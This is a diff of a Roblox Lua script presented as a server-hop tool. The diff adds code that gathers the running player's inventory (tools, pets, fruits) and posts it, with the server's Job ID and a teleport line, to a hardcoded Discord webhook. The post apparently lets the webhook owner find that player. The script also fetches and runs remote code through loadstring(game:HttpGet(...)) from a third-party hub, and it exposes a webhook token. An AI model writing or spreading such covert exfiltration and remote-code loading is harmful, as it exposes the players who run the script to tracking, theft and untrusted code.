@@ -7,18 +7,11 @@ local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
--- Clipboard compatibility
 local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
--- Wait until game is fully loaded before continuing
-repeat
-    task.wait(0.1)
-until game:IsLoaded()
-
--- Wait extra 5 seconds before continuing
+repeat task.wait(0.1) until game:IsLoaded()
 task.wait(5)
 
--- UI SETUP
 local function createLoadingUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "ServerHopUI"
@@ -72,21 +65,17 @@ end
 
 local gui, statusLabel, versionLabel = createLoadingUI()
 
--- FUNCTION: Get actual version string from game UI
 local function getActualVersion()
     for _, obj in ipairs(game:GetDescendants()) do
         if obj:IsA("TextLabel") then
             local text = obj.Text
             local version = string.match(text, "^v(%d+)$")
-            if version then
-                return version
-            end
+            if version then return version end
         end
     end
     return nil
 end
 
--- FUNCTION: Check if actual version matches desired
 local function hasCorrectVersion()
     local actualVersion = getActualVersion()
     if actualVersion then
@@ -97,7 +86,6 @@ local function hasCorrectVersion()
     return actualVersion == desiredVersion
 end
 
--- FUNCTION: Copy Job ID to clipboard
 local function copyJobId()
     if setclipboard then
         setclipboard(game.JobId)
@@ -107,33 +95,8 @@ local function copyJobId()
     end
 end
 
--- IMPROVED WEBHOOK FUNCTIONS
-local function SendMessage(url, message)
-    local data = {
-        content = message
-    }
-    local body = HttpService:JSONEncode(data)
-
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body,
-        })
-    end)
-
-    if success and (response.StatusCode == 204 or response.Success) then
-        print("[Webhook] Message sent successfully.")
-    else
-        warn("[Webhook] Failed to send message:", response and response.StatusMessage or "Unknown error")
-    end
-end
-
 local function SendMessageEmbed(url, embed)
-    local data = {
-        embeds = {embed}
-    }
+    local data = { embeds = { embed } }
     local body = HttpService:JSONEncode(data)
 
     local success, response = pcall(function()
@@ -152,38 +115,82 @@ local function SendMessageEmbed(url, embed)
     end
 end
 
--- FUNCTION: Send webhook with job info and ping user using improved function
+-- New function: get inventory items names (tools, fruits, pets)
+local function getInventoryItems()
+    local items = {}
+
+    -- Tools in Backpack
+    if Player:FindFirstChild("Backpack") then
+        for _, tool in pairs(Player.Backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                table.insert(items, tool.Name)
+            end
+        end
+    end
+
+    -- Equipped tools in Character
+    if Player.Character then
+        for _, tool in pairs(Player.Character:GetChildren()) do
+            if tool:IsA("Tool") then
+                table.insert(items, tool.Name)
+            end
+        end
+    end
+
+    -- Pets or fruits? Adjust if you know their container or naming
+    -- Example: if pets are in Player.Pets folder
+    if Player:FindFirstChild("Pets") then
+        for _, pet in pairs(Player.Pets:GetChildren()) do
+            table.insert(items, pet.Name)
+        end
+    end
+
+    -- Example: if fruits are in Player.Fruits folder
+    if Player:FindFirstChild("Fruits") then
+        for _, fruit in pairs(Player.Fruits:GetChildren()) do
+            table.insert(items, fruit.Name)
+        end
+    end
+
+    if #items == 0 then
+        return "None"
+    else
+        return table.concat(items, ", ")
+    end
+end
+
 local function sendWebhook()
     local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
     local discordId = "910015978639872050"
     local players = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers or 0
 
+    local inventory = getInventoryItems()
+
     local embed = {
         title = "Server Version",
         description = string.format(
             "**Place Version:** %s\n\n" ..
-            "**Total Player In Server**\n(%d/%d)\n\n" ..
+            "**Total Player In Server:**\n(%d/%d)\n\n" ..
             "**Job ID:**\n%s\n\n" ..
             "**Teleport Code:**\n```lua\n" ..
             "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n" ..
-            "```",
+            "```\n\n" ..
+            "**Inventory (Pets/Tools/Fruits):**\n%s",
             desiredVersion,
             players, maxPlayers,
             game.JobId,
             PlaceId,
-            game.JobId
+            game.JobId,
+            inventory
         ),
         color = 0x00FF00,
-        footer = {
-            text = "Server Hop Script"
-        }
+        footer = { text = "Server Hop Script" }
     }
 
     SendMessageEmbed(webhookUrl, embed)
 end
 
--- FUNCTION: Server hop to a random public server with cursor pagination (improved)
 local function tryServerHop()
     local servers = {}
     local cursor = nil
@@ -209,7 +216,7 @@ local function tryServerHop()
             warn("-- Failed to get server list.")
             return false
         end
-    until not cursor or #servers >= 50 -- stops early once 50 servers collected for performance
+    until not cursor or #servers >= 50
 
     if #servers > 0 then
         local randomServerId = servers[math.random(1, #servers)]
@@ -222,7 +229,6 @@ local function tryServerHop()
     end
 end
 
--- MAIN LOOP
 task.spawn(function()
     while true do
         if hasCorrectVersion() then
@@ -230,24 +236,28 @@ task.spawn(function()
             print("[✓] Correct version found.")
             copyJobId()
 
-            -- Send webhook and destroy UI
             sendWebhook()
-            if gui then
-                gui:Destroy()
-            end
+            if gui then gui:Destroy() end
 
-            -- Wait 3 seconds before running the loadstring
+            print("[INFO] Waiting 3 seconds before executing loadstring...")
             task.wait(3)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+            end)
+            if not success then
+                warn("[ERROR] Failed to execute loadstring:", err)
+            else
+                print("[INFO] Loadstring executed successfully.")
+            end
 
             break
         else
             statusLabel.Text = "❌ Version not found. Searching..."
             local hopped = tryServerHop()
             if hopped then
-                break -- stop loop once teleport starts
+                break
             else
-                task.wait(3) -- wait before retrying if teleport failed
+                task.wait(3)
             end
         end
         task.wait(1)
